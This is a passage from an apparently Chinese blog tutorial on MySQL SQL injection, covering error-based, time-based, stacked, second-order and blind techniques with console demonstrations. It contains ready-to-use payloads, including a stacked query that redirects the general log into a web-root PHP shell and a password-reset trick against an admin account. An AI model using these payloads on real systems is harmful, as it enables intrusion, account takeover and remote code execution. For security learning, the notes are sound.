analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure></li><li><p>延时注入(5.0.0&lt; MySQL &lt;5.6.6版本)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *  from math order by id desc limit 0,1 procedure analyse(if(substring(version(),1,1)&#x3D;5,benchmark(50000000,encode(&#39;msg&#39;,&#39;by 5 second&#39;)),0),1)</span><br></pre></td></tr></table></figure><p>只能使用BENCHMARK，而不能使用sleep</p></li></ul></li></ul></li></ul><h5 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h5><p>定义</p><p>堆叠可以理解为多个sql语句放在一起，一起执行，在mysql命令行中我们的sql语句是以分号分割的，所以我们在sql注入的时候可以考虑，是否可以进行多语句执行注入。例如在mysql中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select  * from  math;select user();</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | 李明      |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|   25 | gongcheng |</span><br><span class="line">|    3 | chengxian |</span><br><span class="line">|   25 | gongcheng |</span><br><span class="line">+------+-----------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">+----------------+</span><br><span class="line">| user()         |</span><br><span class="line">+----------------+</span><br><span class="line">| root@localhost |</span><br><span class="line">+----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>而union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。</p><p>原理：</p><ul><li><p>mysql_query与mysqli-&gt;multi_query()</p><p>mysql_query() 函数执行一条 MySQL 查询。</p><p>mysqli_multi_query()支持多查询，多查询使用多个分号进行分隔。</p></li><li><p>利用配合日志getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1;set global general_log&#x3D;&#39;on&#39;;set global general_log_file&#x3D;&#39;D:\\wwwroot\\web\\shell.php&#39;;#</span><br><span class="line">id&#x3D;1;select &#39;&lt;?php phpinfo();?&gt;&#39;;#</span><br></pre></td></tr></table></figure></li></ul><h5 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h5><ul><li><p>原理：</p><p>用户第一次输入的数据，经过各种函数处理比如<code>addslashes</code>或者<code>get_magic_quotes_gpc</code>之后，仍然被原封不动的保存在数据库中，即存入了脏数据，当程序从数据库中取出脏数据的时候，进而产生了二次注入。</p></li><li><p>实例：</p><p>sqlib-24</p><p>我们需要先去注册一个用户名为admin’ #的用户，用户名存入数据库，当我们需要修改当前用户的密码的时候，我们直接输入用户名，无须输入密码即可成功修改。</p><p>程序从数据库中取出脏数据后，执行的sql语句就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;admin&#39;#&#39; and password&#x3D;&#39;$curr_pass&#39;</span><br></pre></td></tr></table></figure></li></ul><h5 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h5><ul><li><p>原理：</p><p>指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施SQL注入。盲注一般分为布尔盲注和基于时间的盲注。</p><p>盲注分为两类：<br> 　　　1.布尔盲注　布尔很明显Ture跟Fales，也就是说它只会根据你的注入信息返回Ture跟Fales，也就没有了之前的报错信息。<br> 　　　2.时间盲注　界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。</p></li><li><p>常用函数</p><h5 id="IF"><a href="#IF" class="headerlink" title="IF()"></a>IF()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IF(expr1,expr2,expr3)</span><br></pre></td></tr></table></figure><p>如果 expr1 是TRUE (expr1 &lt;&gt; 0 and expr1 &lt;&gt; NULL)，则 IF()的返回值为expr2; 否则返回值则为 expr3。IF() 的返回值为数字值或字符串值，具体情况视其所在语境而定。</p><h5 id="MID"><a href="#MID" class="headerlink" title="MID()"></a>MID()</h5><p>MID() 函数用于从文本字段中提取字符。</p><p><code>SELECT MID(column_name,start[,length]) FROM table_name;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT MID(&#39;NowaMagic&#39;,1,2);</span><br><span class="line">+----------------------+</span><br><span class="line">| MID(&#39;NowaMagic&#39;,1,2) |</span><br><span class="line">+----------------------+</span><br><span class="line">| No                   |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT MID(&#39;NowaMagic&#39;,1,3);</span><br><span class="line">+----------------------+</span><br><span class="line">| MID(&#39;NowaMagic&#39;,1,3) |</span><br><span class="line">+----------------------+</span><br><span class="line">| Now                  |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT MID(&#39;NowaMagic&#39;,0,3);</span><br><span class="line">+----------------------+</span><br><span class="line">| MID(&#39;NowaMagic&#39;,0,3) |</span><br><span class="line">+----------------------+</span><br><span class="line">|                      |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure><p><strong>substr()</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,3);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,1,3) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| Now                     |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,1);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,1,1) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| N                       |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,2,1);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,2,1) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| o                       |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,3,1);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,3,1) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| w                       |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,3);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,1,3) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| Now                     |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,2);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,1,2) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| No                      |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,0,2);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,0,2) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                         |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT substr(&#39;NowaMagic&#39;,0,1);</span><br><span class="line">+-------------------------+</span><br><span class="line">| substr(&#39;NowaMagic&#39;,0,1) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                         |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p><strong>case()</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select case 2 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end;</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| case 2 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| two                                                        |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select case 1 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end;</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| case 1 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| one                                                        |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select case 3 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end;</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| case 3 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| more                                                       |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h5 id="ord"><a href="#ord" class="headerlink" title="ord()"></a>ord()</h5><p>ORD() 函数返回字符串第一个字符的 <a href="http://www.nowamagic.net/academy/tag/ASCII">ASCII</a> 值。</p><h5 id="ELT-N-str1-str2-str3-…"><a href="#ELT-N-str1-str2-str3-…" class="headerlink" title="ELT(N,str1,str2,str3,…)"></a>ELT(N,str1,str2,str3,…)</h5><p>如果N =1返回str1，如果N= 2返回str2，等等。返回NULL如果参数的数量小于1或大于N。ELT()是FIELD()的补集。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT ELT(1, &#39;ej&#39;, &#39;Heja&#39;, &#39;hej&#39;, &#39;foo&#39;);</span><br><span class="line">+---------------------------------------------------------+</span><br><span class="line">| ELT(1, &#39;ej&#39;, &#39;Heja&#39;, &#39;hej&#39;, &#39;foo&#39;)                      |</span><br><span class="line">+---------------------------------------------------------+</span><br><span class="line">| ej                                                      |</span><br><span class="line">+---------------------------------------------------------+</span><br></pre></td></tr></table></figure></li><li><p>sleep()、BENCHMARK()</p></li><li><p>笛卡尔积</p><p>原理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AxB&#x3D;A和B中每个元素的组合所组成的集合，就是连接表</span><br></pre></td></tr></table></figure><p>具体的方式就是将简单的表查询不断的叠加，使之以指数倍运算量的速度增长，不断增加系统执行 sql 语句的负荷，直到产生攻击者想要的时间延迟，利用系统自带的表和字段来完成攻击。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT count(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C;</span><br></pre></td></tr></table></figure><p>根据数据库查询的特点，这句话的意思就是将 A B C 三个表进行笛卡尔积（全排列），并输出 最终的行数。</p><p>实例：</p><p>配合if</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table where id &#x3D; 1 and (if(substr(database(),1,1)&#x3D;&#39; &#39;, select count(*) from information_schema.columns A, information_schema.columns B,information_schema.columns C, null))</span><br></pre></td></tr></table></figure></li><li><p>Get_lock() 加锁机制</p><p>在单数据库的环境下，如果想防止多个线程操作同一个表（多个线程可能分布在不同的机器上），可以使用这种方式，取表名为key，操作前进行加锁，操作结束之后进行释放，这样在多个线程的时候，即保证了单个表的串行操作，又保证了多个不同表的并行操作。</p><p>(1)GET_LOCK有两个参数，一个是key,表示要加锁的字段，另一个是加锁失败后的等待时间(s)，一个客户端对某个字段加锁以后另一个客户端再想对这个字段加锁就会失败，然后就会等待设定好的时间</p><p>(2)当调用 RELEASE_LOCK来释放上面加的锁或客户端断线了，上面的锁才会释放，其它的客户端才能进来。</p><p>原理：</p><p>尝试对一个字段加锁</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select get_lock(&#39;username&#39;,10);</span><br><span class="line">  +-------------------------+</span><br><span class="line">| get_lock(&#39;username&#39;,10) |</span><br><span class="line">  +-------------------------+</span><br><span class="line">  |                       1 |</span><br><span class="line">  +-------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>尝试开启另一个客户端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select get_lock(&#39;username&#39;,10);</span><br><span class="line">+-------------------------+</span><br><span class="line">| get_lock(&#39;username&#39;,10) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       0 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (10.01 sec)</span><br></pre></td></tr></table></figure><p>实例：</p><p>对有一个字段加锁</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from ctf where flag &#x3D; 1 and get_lock(&#39;username&#39;,1);</span><br></pre></td></tr></table></figure><p>再次加锁(配合if)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from ctf where flag &#x3D; 1 and 1 and if(substr(database(),1,1),get_lock(&#39;username&#39;,5),null);</span><br></pre></td></tr></table></figure><p>限制条件：</p><p>限制条件就是数据库的连接必须是持久连接，我们知道 mysql_connect() 连接数据库后开始查询，然后调用 mysql_close()  关闭与数据库的连接，也就是 web  服务器与数据库服务器连接的生命周期就是整个脚本运行的生命周期，脚本结束连接即断开，但是很明显这里我们要利用的是前一个连接对后一个连接的阻碍作用导致延时，所以这里的连接必须是持久的。在Apache+PHP搭建的环境中需要使用 mysql_pconnect函数来连接数据库。</p></li><li><p>其他盲注函数–mysql中用regexp是区分大小写的</p><ul><li><p>lpad和rpad函数</p><p>lpad(sourceStr, length, newStr)，将字符串newStr填补到sourceStr左边，直到sourceStr长度达到length。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select lpad(1,5,2);</span><br><span class="line">+-------------+</span><br><span class="line">| lpad(1,5,2) |</span><br><span class="line">+-------------+</span><br><span class="line">| 22221       |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></li></ul><p>配合盲注</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select length(lpad(1,(select length(database())),2));</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">| length(lpad(1,(select length(database())),2)) |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">|                                             4 |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select lpad(1,(select length(database())),2);</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| lpad(1,(select length(database())),2) |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| 2221                                  |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><ul><li><p>like和regexp:</p><p>Like:</p><p>% : 匹配0个或任意多个字符</p><p>_ : 匹配任意一个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database();</span><br><span class="line">+------------+</span><br><span class="line">| database() |</span><br><span class="line">+------------+</span><br><span class="line">| test       |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>判断第一个字符是否是t</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database() like &#39;t%&#39;;</span><br><span class="line">+----------------------+</span><br><span class="line">| database() like &#39;t%&#39; |</span><br><span class="line">+----------------------+</span><br><span class="line">|                    1 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>判断前两个字符是不是te</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database() like &#39;te%&#39;;</span><br><span class="line">+-----------------------+</span><br><span class="line">| database() like &#39;te%&#39; |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     1 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>判断是否包含es两个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database() like &#39;%es%&#39;;</span><br><span class="line">+------------------------+</span><br><span class="line">| database() like &#39;%es%&#39; |</span><br><span class="line">+------------------------+</span><br><span class="line">|                      1 |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>判断有几个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database() like &#39;_____&#39;;</span><br><span class="line">+-------------------------+</span><br><span class="line">| database() like &#39;_____&#39; |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       0 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select database() like &#39;____&#39;;</span><br><span class="line">+------------------------+</span><br><span class="line">| database() like &#39;____&#39; |</span><br><span class="line">+------------------------+</span><br><span class="line">|                      1 |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>判断第一个字符是否t</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database() like &#39;t___&#39;;</span><br><span class="line">+------------------------+</span><br><span class="line">| database() like &#39;t___&#39; |</span><br><span class="line">+------------------------+</span><br><span class="line">|                      1 |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>like配合盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from math where id &#x3D;1 and if((select database() like &#39;t___&#39;),1,0);</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | 李明      |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | 444       |</span><br><span class="line">|    1 | 444       |</span><br><span class="line">+------+-----------+</span><br><span class="line">6 rows in set (0.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from math where id &#x3D;1 and if((select database() like &#39;s___&#39;),1,0);</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure><p>注意点就是如果匹配成功就会返回1否则就是0。</p><p>REGEXP:</p><p>盲注值正则表达式攻击(^、&amp;)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select name from math where id&#x3D;3;</span><br><span class="line">+-----------+</span><br><span class="line">| name      |</span><br><span class="line">+-----------+</span><br><span class="line">| chengxian |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;^c&#39;;</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">| (select name from math where id&#x3D;3) regexp&#39;^c&#39; |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">|                                             1 |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;^s&#39;;</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">| (select name from math where id&#x3D;3) regexp&#39;^s&#39; |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">|                                             0 |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;n$&#39;;</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">| (select name from math where id&#x3D;3) regexp&#39;n$&#39; |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">|                                             1 |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;an$&#39;;</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">| (select name from math where id&#x3D;3) regexp&#39;an$&#39; |</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">|                                              1 |</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">regexp &#39;^[a-z]&#39;  #判断一个表的第一个字符串是否在a-z中</span><br><span class="line">regexp &#39;^r&#39;      #判断第一个字符串是否为r</span><br><span class="line">regexp &#39;^r[a-z]&#39; #判断一个表的第二个字符串是否在a-z中(这里可以使用二分法)</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li><p>提高盲注速度</p><p>DNSlog+盲注</p><p><code>https://wooyun.js.org/drops/%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E4%BD%BF%E7%94%A8DNS%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.html</code></p><p>原理：</p><p>Dnslog就是存储在DNS Server上的域名信息，它记录着用户对域名<a href="http://www.test.com、t00ls.com.等的访问信息./">www.test.com、t00ls.com.等的访问信息。</a></p><p>通过合适的sql语句，在数据库中执行之后，一条带有数据库查询结果的域名就被提交到DNS服务器进行解析。</p><p>可以查看DNS服务器上的Dnslog就可以得到SQL注入结果。<a href="http://ceye.io上我们可以获取到有关`ceye.io`的dns查询信息./">http://ceye.io上我们可以获取到有关`ceye.io`的DNS查询信息。</a></p><p>在域名解析的过程中，是由顶级域名向下逐级解析的，我们构造的攻击语句也是如此，当它发现域名中存在<code>ceye.io</code>时，它会将这条域名信息转到相应的NS服务器上，而通过<a href="http://ceye.io我们就可以查询到这条dns解析记录./">http://ceye.io我们就可以查询到这条DNS解析记录。</a></p><p>Microsoft SQL Server</p><figure class="highlight plain"><table><tr><td 